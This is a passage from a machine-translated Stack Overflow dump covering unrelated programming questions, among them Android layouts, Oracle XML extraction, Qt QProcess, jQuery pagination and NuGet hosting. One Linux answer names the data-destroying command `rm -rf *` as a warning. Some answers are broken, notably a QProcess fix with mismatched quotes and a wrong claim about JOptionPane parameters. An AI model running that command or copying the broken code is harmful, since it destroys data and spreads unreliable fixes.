 this is the way to go
 this is not really it
 what did they say it was
 laughing hahahahahahahaa
 are we on the right path
 this is not really it
 what did they say it was
 smiling hahahahahahahaha
 they are way behind 
 tell me how to get therr
 home here we come
 hahahahahahahaha they laught
 are we on the right path
 this is not really it
 what did they say it was 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T03:24:37.880

假设文件适合内存，我将使用 Files.readAllLines(path,charset) （Java 7）将所有行读入列表，然后对列表进行比较

如果文件太大，则创建一个方法

```
List<String> readLines(Scanner sc, int nLines) {
    List<String> list = new ArrayList<>();
    for (int i = 0; i < nLines; i++) {
        list.add(sc.nextLine());
    }
    return list;
} 
```

并使用它来读取/跳过文件的某些部分

```
Scanner sc = new Scanner(new File("path"));
List<String> list1 = readLines(sc, 3);
readLines(sc, 1);
List<String> list2 = readLines(sc, 3);
boolean res = list1.equals(list2) 
```

# java - android - 带有滚动视图的并排按钮

> ID：15562079
> 
> 赞同：1
> 
> 时间：2013-03-22T03:13:35.627
> 
> 标签：java, android, layout

我正在尝试创建一个布局，该布局在屏幕顶部有两个等宽的按钮，然后在其正下方有一个滚动视图。我在滚动视图中有一个 linearLayout，因为这是我动态创建 UI 元素的地方。

按钮定位正确，但我的滚动视图被隐藏或滚动视图内的线性布局被隐藏，我无法判断并且对布局了解不足，无法确定发生了什么。我究竟做错了什么？我在 LinearLayout 中创建了一个 TextView 占位符，以判断我是否可以看到任何内容并且它没有显示出来。

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:id="@+id/EditRecordOuterLayout"
android:layout_width="fill_parent"
android:layout_height="fill_parent" >

 <LinearLayout
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_alignParentLeft="true"
    android:orientation="horizontal"
    >

    <RelativeLayout
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="fill_parent"
        android:layout_height="match_parent"
        android:layout_weight="1" >

        <RelativeLayout
            android:id="@+id/Bforeground"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:gravity="center" >

            <TextView
                android:id="@+id/cancelButtonText"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_centerInParent="true"
                android:textSize="20dp"
                android:text="Cancel" />

            <ImageView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_centerVertical="true"
                android:layout_toLeftOf="@id/cancelButtonText"
                android:paddingBottom="10dip"
                android:paddingTop="10dip"
                android:src="@drawable/cancel" />
        </RelativeLayout>
                    <Button
            android:layout_width="fill_parent"
            android:layout_height="match_parent"
            android:layout_alignBottom="@id/Bforeground"
            android:layout_alignLeft="@id/Bforeground"
            android:layout_alignRight="@id/Bforeground"
            android:layout_alignTop="@+id/Bforeground"
            android:onClick="clickedMe"
            android:gravity="center" />
    </RelativeLayout>

    <RelativeLayout
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="fill_parent"
        android:layout_height="match_parent"
        android:layout_weight="1" >

        <RelativeLayout
            android:id="@+id/foreground"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:gravity="center" >

            <TextView
                android:id="@+id/button_text"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_centerInParent="true"
                android:textSize="20dp"
                android:text="Save" />

            <ImageView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_centerVertical="true"
                android:layout_toLeftOf="@id/button_text"
                android:paddingBottom="10dip"
                android:paddingTop="10dip"
                android:src="@drawable/save" />
        </RelativeLayout>
                    <Button
            android:layout_width="fill_parent"
            android:layout_height="match_parent"
            android:layout_alignBottom="@id/foreground"
            android:layout_alignLeft="@id/foreground"
            android:layout_alignRight="@id/foreground"
            android:layout_alignTop="@+id/foreground"
            android:onClick="clickedMe"
            android:gravity="center" />
    </RelativeLayout>
</LinearLayout>
<ScrollView
    android:id="@+id/editRecordScrollView"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

    <LinearLayout
        xmlns:android="http://schemas.android.com/apk/res/android"
        xmlns:tools="http://schemas.android.com/tools"
        android:id="@+id/editRecordLayout"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:orientation="vertical" >
                     <TextView
                android:id="@+id/someText"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_centerInParent="true"
                android:textSize="20dp"
                android:text="This text should be showing..." />
    </LinearLayout>
</ScrollView> 
```

知道了！谢谢你们。固定版本如下。

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/EditRecordOuterLayout"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

     <LinearLayout
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_alignParentLeft="true"
        android:orientation="horizontal"
        >

        <RelativeLayout
            xmlns:android="http://schemas.android.com/apk/res/android"
            android:layout_width="fill_parent"
            android:layout_height="match_parent"
            android:layout_weight="1" >

            <RelativeLayout
                android:id="@+id/Bforeground"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:gravity="center" >

                <TextView
                    android:id="@+id/cancelButtonText"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_centerInParent="true"
                    android:textSize="20dp"
                    android:text="Cancel" />

                <ImageView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_centerVertical="true"
                    android:layout_toLeftOf="@id/cancelButtonText"
                    android:paddingBottom="10dip"
                    android:paddingTop="10dip"
                    android:src="@drawable/cancel" />
            </RelativeLayout>
                        <Button
                android:layout_width="fill_parent"
                android:layout_height="match_parent"
                android:layout_alignBottom="@id/Bforeground"
                android:layout_alignLeft="@id/Bforeground"
                android:layout_alignRight="@id/Bforeground"
                android:layout_alignTop="@+id/Bforeground"
                android:onClick="clickedMe"
                android:gravity="center" />
        </RelativeLayout>

        <RelativeLayout
            xmlns:android="http://schemas.android.com/apk/res/android"
            android:layout_width="fill_parent"
            android:layout_height="match_parent"
            android:layout_weight="1" >

            <RelativeLayout
                android:id="@+id/foreground"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:gravity="center" >

                <TextView
                    android:id="@+id/button_text"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_centerInParent="true"
                    android:textSize="20dp"
                    android:text="Save" />

                <ImageView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_centerVertical="true"
                    android:layout_toLeftOf="@id/button_text"
                    android:paddingBottom="10dip"
                    android:paddingTop="10dip"
                    android:src="@drawable/save" />
            </RelativeLayout>
                        <Button
                android:layout_width="fill_parent"
                android:layout_height="match_parent"
                android:layout_alignBottom="@id/foreground"
                android:layout_alignLeft="@id/foreground"
                android:layout_alignRight="@id/foreground"
                android:layout_alignTop="@+id/foreground"
                android:onClick="clickedMe"
                android:gravity="center" />
        </RelativeLayout>
    </LinearLayout>
    <ScrollView
        android:id="@+id/editRecordScrollView"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" >

        <LinearLayout
            xmlns:android="http://schemas.android.com/apk/res/android"
            xmlns:tools="http://schemas.android.com/tools"
            android:id="@+id/editRecordLayout"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:orientation="vertical" >

        </LinearLayout>
    </ScrollView>
</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T03:18:21.097

您必须将所有 UI 元素放置在单个父布局中。我建议您仍然可以使用 a`LinearLayout`作为顶层，但它应该是垂直的，如下所示：

```
android:orientation="vertical" 
```

在父垂直 LinearLayout 中，您可以为顶部按钮和 a 放置水平 LinearLayout `ScrollView`。那应该这样做。

# sql - Oracle 从 CDATA 中提取价值

> ID：15562080
> 
> 赞同：1
> 
> 时间：2013-03-22T03:13:36.613
> 
> 标签：sql, oracle

我有一个带列的表

```
DETAIL         VARCHAR2(4000) 
```

存储在 DETAIL 列中的示例数据之一是

```
<![CDATA[<DIV STYLE="text-align:LEFT;"><SPAN STYLE="letter-spacing:0px;color:#000000;font-size:10px;font-family:'Verdana';">Value to be extract</SPAN></DIV>]]> 
```

有没有办法在 SQL 选择查询中提取文本？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T03:23:46.900

这是一种方法——尽管格式需要保持如上：

```
SELECT XMLTYPE(REPLACE(REPLACE(DETAIL,'<![CDATA[',''),']]>','')).EXTRACT('/DIV/SPAN/text()').GETSTRINGVAL() 
FROM yourtable 
```

[SQL 小提琴演示](http://sqlfiddle.com/#!4/651d0/1)

基本上这会将详细信息列转换为 html（删除 cdata 信息），然后用于`getstringval`返回某些标签之间的值。

[http://docs.oracle.com/cd/B12037_01/appdev.101/b10790/xdb04cre.htm#i1024803](http://docs.oracle.com/cd/B12037_01/appdev.101/b10790/xdb04cre.htm#i1024803)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-22T12:30:05.510

通过 Oracle XML DB 功能执行此类操作的正确方法：

```
select 
  value_test
from 
XMLTable('$p'    
  passing XMLParse(content '<![CDATA[<DIV STYLE="text-align:LEFT;"><SPAN STYLE="letter-spacing:0px;color:#000000;font-size:10px;font-family:''Verdana'';">Value to be extract</SPAN></DIV>]]>')
  as "p"
  columns value_test varchar2(4000) path '/text()'
); 
```

这样做的另一个变体：

```
select
  dbms_xmlgen.convert(
    XMLQuery('data($p)'    
      passing by value XMLParse(content '<![CDATA[<DIV STYLE="text-align:LEFT;"><SPAN STYLE="letter-spacing:0px;color:#000000;font-size:10px;font-family:''Verdana'';">Value to be extract</SPAN></DIV>]]>')
      as "p"          
      returning content
    ).getCLOBVal(), 
    1
  )  
from dual; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T05:44:01.850

```
regexp_substr(detail, '>([^<]+)<', 1, 1, '', 1) 
```

[小提琴](http://sqlfiddle.com/#!4/651d0/4)- 感谢 sgeddes

# c++ - 将参数正确传递给使用 Qt 的 QProcess 运行的 Linux 二进制文件

> ID：15562083
> 
> 赞同：0
> 
> 时间：2013-03-22T03:13:40.383
> 
> 标签：c++, qt

我有一个我编译并在终端上运行的二进制文件： `./pnrxms dataset-bc.arff 0.1 0.9`其中 pnrxms 是二进制名称， dataset-bc.arff, 0.1, 0.9 是程序需要的三个参数。

为了在 Qt 内部做同样的事情，我使用了以下代码：

```
QProcess sh;
sh.start("sh", QStringList() << "-c" << "/home/r/l33t/Qt_RoughWork/source/menuandtoolbar/pnrxms dataset-bc.arff 0.1 0.9");

sh.waitForFinished();
QByteArray output = sh.readAll();
ui->textBrowser->setText(output); 
```

但这没有用。它确实启动了程序，但未能获取参数。该程序在没有任何参数的情况下运行它的运行方式。

所以，然后我尝试了第二种方法：

```
QProcess sh;

sh.start("sh", QStringList() << "-c" << "/home/r/l33t/Qt_RoughWork/source/menuandtoolbar/pnrxms" <<"dataset-bc.arff"<<"0.1"<<"0.9");

sh.waitForFinished();
QByteArray output = sh.readAll();
ui->textBrowser->setText(output); 
```

然而这一次，什么都没有发生。也就是说，程序根本没有运行。

所以，我的问题是，如何在 QProcess 运行程序时正确地将我的参数传递给我的程序。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-03T09:33:51.490

以下作品：

```
sh.start("sh", QStringList() << "-c" << "/home/r/l33t/Qt_RoughWork/source/menuandtoolbar/pnrxms" dataset-bc.arff 0.1 0.9"); 
```

# javascript - 每次单击 loadmore 按钮时，如何将 getJSON 的结果附加到 div？

> ID：15562085
> 
> 赞同：2
> 
> 时间：2013-03-22T03:13:45.970
> 
> 标签：javascript, jquery, html, ajax, getjson

在加载页面时，我的`getJSON`调用将其输出显示到 div（称为 myDiv）。

现在我想在页面末尾添加一个按钮，当用户单击该按钮时，我想再次调用`getJSON`，但这次我想将 page_number 增加一，每次用户单击按钮时在先前结果的末尾显示新结果。你们能告诉我我该怎么做吗？

```
<head>
  <script>
    //var counter = 1;
    $.getJSON('http://anyorigin.com/get?url=https://www.myothersite.com/getit.php?page_number=+counter&type=TopVideos&sortBy=newest&callback=?', function(data){
      var siteContents = data.contents;
      //writes to textarea
      document.myform.outputtext.value = siteContents;
      document.getElementById("myDiv").innerHTML=siteContents;
      $('#loadingimg').hide();
    });
  </script>
</head>
<body>
  <div class="MainDiv">
    <div class="MainContent">
      <div class="ContentWidth">
        <div id="JSListVideo" class="VideoList">
          <div id="myDiv"></div> 
```

和按钮代码：

```
<div class="MoreButtonSection">
  <div class="RedButton">
    <span class="LeftEnd"></span>
    <span class="Centre">
      <a href="javascript:void(0);" onclick="seemore();" title="See more">see more</a>
    </span>
    <span class="RightEnd"></span>
  </div>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T03:37:05.510

首先将代码包装在`$(document).ready();`.

现在您需要`click`为按钮创建一个事件，以便在单击该按钮时，它会调用`getJson`，然后您可以将数据附加到所需的 div，因为现在您的代码只会**在加载时运行**。

**例子**

```
$(document).ready(function() {
  var counter = 1;
  $('button').on('click',function() {
    $.getJSON('http://anyorigin.com/get?url=https://www.myothersite.com/getit.php?page_number=+counter&type=TopVideos&sortBy=newest&callback=?', function(data) {
      var siteContents = data.contents;
      document.myform.outputtext.value = siteContents;
      $("myDiv").html(siteContents);
      $('#loadingimg').hide();
    });
    counter++;
  });
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-22T03:37:53.140

在回答之前，我建议您坚持使用一种方法，jQuery 语法或 Javascript。我想你想要分页代码。下面的代码可能对你有用。

我想在下面为您提供一些关于如何完成的想法。如果我错了，请纠正我。

```
//initialize page number to 1 default
var pagenumber=1;
$(document).ready(function(){
  //load first page records on page load
  getResult(pagenumber);
});

//pass pagenumber to function to fetch correct page records
function getResult(pagenumber){
  $.getJSON('http://anyorigin.com/get?url=https://www.myothersite.com/getit.php?page_number='+ pagenumber +'+counter&type=TopVideos&sortBy=newest&callback=?', function(data){});
  //after every call increment page number value
  pagenumber++;
}
$('btnLoadMore').click(function(){
  //simply call getResult
  getResult(pagenumber);
}); 
```

我无法`seemore()`在您的代码中找到该函数。也许你想要这样的东西。您的 HTML 必须是：

```
<a href="#" onclick="return seemore();" title="See more">see more</a> 
```

JS 必须是：

```
function seemore(){
  counter++;
  return false;
} 
```

`counter`必须是全局变量才能访问。不知道您的网址：

```
http://anyorigin.com/get?url=https://www.myothersite.com/getit.php?page_number=+counter&type=TopVideos&sortBy=newest&callback=? 
```

我认为应该是：

```
http://anyorigin.com/get?url=https://www.myothersite.com/getit.php?page_number='+ counter +'&type=TopVideos&sortBy=newest&callback=? 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-22T03:17:26.180

您可以将值添加到当前值。看下面：

```
document.getElementById("myDiv").innerHTML += siteContents; 
```

# asp.net - FileUpload control not populating control?

> ID：15562086
> 
> 赞同：0
> 
> 时间：2013-03-22T03:13:55.963
> 
> 标签：asp.net, vb.net

I have a FileUpload control on my web page that isn't populating the control like it should. It looked pretty straight forward in doing this but obviously I'm doing something wrong. I'm testing this in my IIS so my Server.MapPath value is "C:\inetpub\wwwroot\MWP\Images\Img1.jpg". Here is my code below:

```
 Protected Sub btnUpload_Click(sender As Object, e As System.EventArgs) Handles btnUpload.Click
    Try
        Dim strFileName As String = ""

        Session("filePath") = Server.MapPath("/MWP/Images/") & FileUpload1.FileName

        FileUpload1.SaveAs(Session("filePath"))
        img1.ImageUrl = Session("filePath")

    Catch ex As Exception
        strMsg = "btnUpload_Click() - " & ex.Message
    End Try
End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T03:20:25.880

尝试

```
img1.ImageUrl = "/MWP/Images/" & FileUpload1.FileName 
```

另外，除非您在其他地方需要文件的路径，否则您不需要使用 Session，只需使用

```
string filePath = Server.MapPath("/MWP/Images/") & FileUpload1.FileName

FileUpload1.SaveAs(filePath) 
```

# c# - C# Wpf toolkit autocomplebox - 如何获取选中项？

> ID：15562088
> 
> 赞同：1
> 
> 时间：2013-03-22T03:14:56.923
> 
> 标签：c#, wpf, binding, autocompletebox

我正在尝试从 wpf 工具包 autoCompleBox（来自 codeplex 的那个）访问选定的项目，但我不断收到空引用错误。

我真的撞到了一堵砖墙！

这是我的 XAML：

```
 <my:AutoCompleteBox
     x:Name="autoTxtBoxProductCode"
     VerticalAlignment="Top" Height="28" Margin="112,10,0,0" Width="144"           
     Background="#FFEDF4AB"
     Populating="AutoBoxPopulateProductCode"
     ValueMemberPath="ProductCode"
     PreviewKeyUp="autoTxtBoxProductCode_PreviewKeyUp"
     HorizontalAlignment="Left" 
     IsTextCompletionEnabled="False"

      <my:AutoCompleteBox.ItemTemplate>
            <DataTemplate>
              <StackPanel Orientation="Horizontal">
                  <TextBlock Text="{Binding ProductID}" FontWeight="Bold" Foreground="Black" Width="25"/>
                  <TextBlock Text="{Binding ProductBrandCode}" FontWeight="Bold" Foreground="Black" Width="55"/>
                  <TextBlock Text="{Binding ProductCode}" Foreground="Black"/>
                </StackPanel>
              </DataTemplate>         
             </my:AutoCompleteBox.ItemTemplate>
        </my:AutoCompleteBox> 
```

这就是我更新项目来源的方式：

```
 private void AutoBoxPopulateProductCode(object sender, System.Windows.Controls.PopulatingEventArgs e)
    {
        // TextBox t = (TextBox)sender;

        autoTxtBoxProductCode.ItemsSource = Product.GetListOfProductCodesAndBrands(autoTxtBoxProductCode.Text.ToString());
        autoTxtBoxProductCode.PopulateComplete();
    } 
```

我要存档的是当用户按 Enter 键时我想获取 ProductID。

我尝试过这样的事情：

```
 private void autoTxtBoxProductCode_PreviewKeyUp(object sender, KeyEventArgs e)
    {

        if (e.Key != Key.Enter)
        { return; }
        else
        {   
            Product prd = (Product)(autoTxtBoxProductCode.SelectedItem);
            MessageBox.Show(prd.ProductID.ToString());

        }

    } 
```

但上面返回空引用错误。

我必须缺少某种绑定，但由于 WPF 对我来说是新的，我无法弄清楚需要更改什么。

帮助将不胜感激。

编辑：

就在发布这个问题后，我找到了解决方案。我需要补充的是：

```
SelectedItem="{Binding ElementName=this,
               Path=ProductID,
               Mode=TwoWay,
               UpdateSourceTrigger=LostFocus}" 
```

我希望它可以帮助其他有类似问题的人。

干杯，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-17T02:24:57.397

就在发布这个问题后，我找到了解决方案。我需要补充的是：

```
SelectedItem="{Binding ElementName=this,
           Path=ProductID,
           Mode=TwoWay,
           UpdateSourceTrigger=LostFocus}" 
```

# linux - 如何使用通配符名称创建子目录，Linux

> ID：15562091
> 
> 赞同：0
> 
> 时间：2013-03-22T03:15:15.640
> 
> 标签：linux, command-line, wildcard

我需要创建一些子目录，但名称需要完全是通配符。

前任：`*** ???`

如何消除它们的特殊含义？我以为这只是引号，但它似乎不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T03:17:52.873

这就是您可以使用目录/文件夹名称中的通配符一次创建多个目录的方法。

```
$ mkdir "***" "???"
$ ls -ld "***" "???" 
drwx------ 2 me users 2048 Mar 22 08:02 ***
drwx------ 2 me users 2048 Mar 22 08:02 ??? 
```

顺便说一句，这是**非常危险**的。它可能会导致您不小心键入`rm -rf *`. 我什至拒绝输入那个命令，因为害怕不小心想起它。我总是用`rm`.

# ftp - FTP 连接错误 远程主机没有响应

> ID：15562092
> 
> 赞同：0
> 
> 时间：2013-03-22T03:15:16.813
> 
> 标签：ftp

在尝试将文件从一台服务器移动到另一台服务器时，我不断收到此消息。

ftp:connect：远程主机在超时时间内没有响应。

可能是什么原因，我该如何解决？

谢谢！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T03:22:53.633

*   检查服务器防火墙
*   检查开放端口
*   检查服务器或网络是否繁忙
*   检查服务器指定的超时时间

# java - JoptionPane 有时为空白

> ID：15562097
> 
> 赞同：2
> 
> 时间：2013-03-22T03:16:00.473
> 
> 标签：java, swing, user-interface, joptionpane, event-dispatch-thread

我在我的生产代码中使用这种风格：

```
if (SwingUtilities.isEventDispatchThread()) {
    JOptionPane.showMessageDialog(parent, "message", "title", JOptionPane.INFORMATION_MESSAGE);
} else {
    SwingUtilities.invokeLater(new Runnable() {
        @Override
        public void run() {
            JOptionPane.showMessageDialog(parent, "message", "title", JOptionPane.INFORMATION_MESSAGE);
        }
    });
} 
```

它在大多数情况下运行良好，但有时它只是显示一个只有标题的空白对话框。对这个问题有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T05:28:40.387

我认为这是因为`SwingUtilities.isEventDispatchThread()`和 `SwingUtilities.invokeLater();`。

但是，你确定你的代码是正确的吗？

这些是`showMessageDialog()`

```
showMessageDialog(Component c, Object msg);

showMessageDialog(Component c, Object msg, String title, int messageType)

showMessageDialog(Component c, Object msg, String title, int messageType, Icon icon) 
```

但是在您的代码中，您的第一个参数需要一个`String`!!

# ruby-on-rails - 如何让用户成为管理员

> ID：15562100
> 
> 赞同：0
> 
> 时间：2013-03-22T03:16:41.193
> 
> 标签：ruby-on-rails

我正在用 Ruby 创建一个网站，我希望可以选择注册为管理员或用户。我已经使用设计创建了注册系统，我希望能够为不同的用户（即管理员和用户）授予不同的权限。多谢你们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T03:17:49.483

[这里](https://github.com/plataformatec/devise/wiki/How-To%3a-Add-an-Admin-role)有一个全面的指南。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T03:19:19.517

这是一篇关于使用[Devise 和 CanCan](http://www.tonyamoyal.com/2010/07/28/rails-authentication-with-devise-and-cancan-customizing-devise-controllers/)来完成您正在寻找的内容的帖子。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T05:51:51.480

您可以将布尔字段管理员和用户添加到您的用户模型中。因此，在创建时，您可以分配管理员或用户角色。

这个问题在这里得到了回答：
[如何定义用户角色](https://stackoverflow.com/questions/15439182/how-to-define-user-roles/15445492#15445492)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-22T06:09:12.110

您可以使用 devise + cancan 并定义用户和管理员等角色来分隔普通用户和应用程序管理员。

```
class User < AB
  has_many :roles

  def is_admin?
    roles.include?(:admin)
  end
end

class Role < AB

end 
```

然后像这样在cancan的定义文件中检查它

```
 can :update, Model do |model|
    user.admin?
  end 
```

该视频为您提供有关它的详细信息[http://railscasts.com/episodes/192-authorization-with-cancan](http://railscasts.com/episodes/192-authorization-with-cancan)

# c# - 如何在像素着色器中实现超级采样/抗锯齿？

> ID：15562102
> 
> 赞同：2
> 
> 时间：2013-03-22T03:16:52.210
> 
> 标签：c#, wpf, hlsl, antialiasing, pixel-shader

我正在尝试编写几个像素着色器以应用于类似于 Photoshop 效果的图像。例如这个效果： [http ://www.geeks3d.com/20110428/shader-library-swirl-post-processing-filter-in-glsl/](http://www.geeks3d.com/20110428/shader-library-swirl-post-processing-filter-in-glsl/)

但我注意到生成的图像中有锯齿。我能做些什么来防止这种情况发生？我找不到任何解释如何解决这个问题的文章。我阅读了一些技术，例如以高分辨率渲染然后缩小图像，但我需要在像素着色器容量中解决这个问题。但如果有什么可以帮助的，我将不胜感激。

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2013-03-22T03:26:55.730

[WPF 着色器效果库](http://wpffx.codeplex.com/)已经具有相同的效果，以及许多其他效果。您可以从链接下载源代码。

# templates - 具有可自定义节点模板的 AngularJS 中的树视图

> ID：15562112
> 
> 赞同：1
> 
> 时间：2013-03-22T03:17:34.853
> 
> 标签：templates, angularjs, treeview

我想创建一个指令，它将采用树状数据并将其提供给一些树视图脚本（使用标记作为输入），使用特定的 HTML 模板来呈现节点。因此，指令将数据 + 节点模板作为输入，插入 DOM 子树，然后调用第三方插件使其可排序（如果这很重要，我会想到[http://dbushell.github.com/Nestable/](http://dbushell.github.com/Nestable/)）。

我有一个解决方案，但它远非优雅。这是 HTML 代码（完整示例可以在[http://jsfiddle.net/DQjve/](http://jsfiddle.net/DQjve/)找到）：

```
<div ng-app="TestApp" ng-controller="TestCtrl">
    <script type="text/ng-template" id="tree.html">
        <div>
            <ng-include src="'branch.html'"></ng-include>
        </div>
    </script>

    <script type="text/ng-template" id="branch.html">
        <ul>
            <li ng-repeat="leaf in leaf.children" ng-include src="'leaf.html'">
            </li>
        </ul>
    </script>

    <script type="text/ng-template" id="leaf.html">
        <ng-include src="template"></ng-include>
        <ng-include src="'branch.html'"></ng-include>
    </script>

    <script type="text/ng-template" id="my-leaf.html">
        <span style="display: block; border: 1px solid gray; border-radius: 4px; background: yellow; margin: 3px 0; padding: 4px;">{{leaf.name}}</span>
    </script>

    <tree root="tree" template="my-leaf.html"></tree>
</div> 
```

所需的代码如下所示：

```
<div ng-app="TestApp" ng-controller="TestCtrl">
    <tree root="tree" template="my-leaf.html">
        <span style="display: block; border: 1px solid gray; border-radius: 4px; background: yellow; margin: 3px 0; padding: 4px;">{{leaf.name}}</span>
    </tree>
</div> 
```

目标：

1.  （不太重要）将所有实用程序模板放在指令 JavaScript 代码中。
2.  （更重要）使用 <tree> 标签的内容作为节点模板。

但我找不到解决方案。

对于第 1 点：可能，我需要使用`$templateCache`预缓存我的模板？有一些独特的模板名称？有没有更好的解决方案？

对于第 2 点：我应该使用`ngTransclude`p.2 吗？如果是，如何？有没有办法在任何编译发生之前将初始 <tree> 标记的内容作为字符串获取？

# record - IronSpeed 错误：KeyValue.ColumnValueByName() 中的参数无效

> ID：15562114
> 
> 赞同：1
> 
> 时间：2013-03-22T03:17:42.717
> 
> 标签：record, editing, ironspeed

我正在使用 IronSpeed 开发一个网站。一位同事对数据库进行了更改。在获取代码时，我收到错误消息： IronSpee 错误：当我尝试编辑记录时***，KeyValue.ColumnValueByName() 中的参数无效。***

我该如何解决这个问题？谢谢你，西蒙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T13:50:47.007

只需重新同步数据库模式，您就可以节省大量时间。Iron Speed 会在添加或缺失的字段上进行处理，并且不需要返工。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-23T12:21:59.247

我们必须删除整个模块（又名显示、编辑和添加页面），然后在应用程序向导的帮助下重新创建它们。可以通过工具>应用程序向导菜单访问此向导。

参考资料：[http ://sjc.ironspeed.com/post/IronSpeed-Error-Invalid-Parameter-in-KeyValue.ColumnValueByName%28-%29-6265041](http://sjc.ironspeed.com/post/IronSpeed-Error-Invalid-Parameter-in-KeyValue.ColumnValueByName%28-%29-6265041)

希望这对将来的人有所帮助。

# mongodb - MongoDB 是否有任何客户端-服务器架构？

> ID：15562118
> 
> 赞同：0
> 
> 时间：2013-03-22T03:18:18.623
> 
> 标签：mongodb, master-slave

我想为MongoDB构建一个主从架构并满足以下约束：

1.  master 可以随时读写。
2.  从服务器每小时同步一次，并且只能读取。

有什么建议吗？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T09:27:11.207

不确定您想要实现什么，但是您可以使用具有以下配置的副本集获得类似的设置：

```
cfg = rs.conf()
cfg.members[0].priority = 0
cfg.members[0].slaveDelay = 3600
rs.reconfig(cfg) 
```

这将使副本集的成员 0 滞后一小时，并且由于它的优先级为 0，因此它不能成为 master，因此不能直接写入。

这并不完全满足您的限制，因为您希望每小时同步一次，而此设置会不断更新以反映 T-1h 的状态。不幸的是，唯一想到的是计划备份操作，这可能也不是您想要的。

# package - NuGet 提要托管选项，包括 MyGet

> ID：15562121
> 
> 赞同：4
> 
> 时间：2013-03-22T03:18:33.093
> 
> 标签：package, nuget, nuget-package, nuget-server, myget

我一直在研究 NuGet 提要主机的选项。

目前，我们使用 TeamCity 构建/发布包到 TC 的内置服务器。对于指向 TC 的 Visual Studio 包源，我们发现订阅/更新过程非常缓慢——即使我们的开发人员工作站位于同一个本地子网中并且我们只有几十个包。

我知道的其他包裹提要选项：

1.  净重分享
2.  基于 NuGet.Server 的内部网络服务器
3.  我的获取
4.  ProGet

是否有人对这些解决方案有企业级经验？

MyGet 看起来很有希望，但令人担忧的一个原因是（至少根据他们的网站）只有大约 1500 个订阅源处于活动状态。如果 MyGet 真的流行起来，这似乎应该是 150,000 左右。

另外：NuGet 世界中是否有任何类似于 Maven 的本地“快照”包引擎和提要服务器概念的东西？

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-22T09:09:17.413

作为 MyGet 的创始人之一，让我回答这个问题 :-) 我们确实在我们的*公共*网站上托管了大约 1.500 个提要，我们也有一些企业用户拥有自己的域，但未在此处列出。如果您需要更多信息或想与其中一位取得联系，请随时与我们联系。我们也开放聊天，所以请随意。

在 Gallery ( [http://www.myget.org/gallery](http://www.myget.org/gallery) ) 中，我们有 SignalR、RavenDB、Glimpse 等著名项目，ASP.NET 团队也在推动他们的夜间活动。

在现场，我们看到许多基于 NuGet.Server 的“自托管”解决方案，但这些通常是较小的安装。就像网络共享一样，当该提要中的软件包过多时，它的性能会有所下降。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T21:39:43.077

说到性能，我们最新的 ProGet 2.0 版本进行了一些性能增强，主要是缓存 LDAP 凭据以及包数据现在缓存在数据库中的事实，因此添加包不必重建包的完整索引（以前如果与 RedGate 的部署管理器存储的 1000 多个包相结合，它会减慢速度）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-15T12:29:29.967

I'd like to add two products to the list.

*   Sonatype's Nexus pro - If you are running a mixed Java/.NET shop it might be a good alternative. [http://www.sonatype.com/nexus/features](http://www.sonatype.com/nexus/features). I'm not sure here but since Nexus is a maven tool from beginning it would be plausible that it has some kind of snapshot support for nuget feeds as well, however not local.
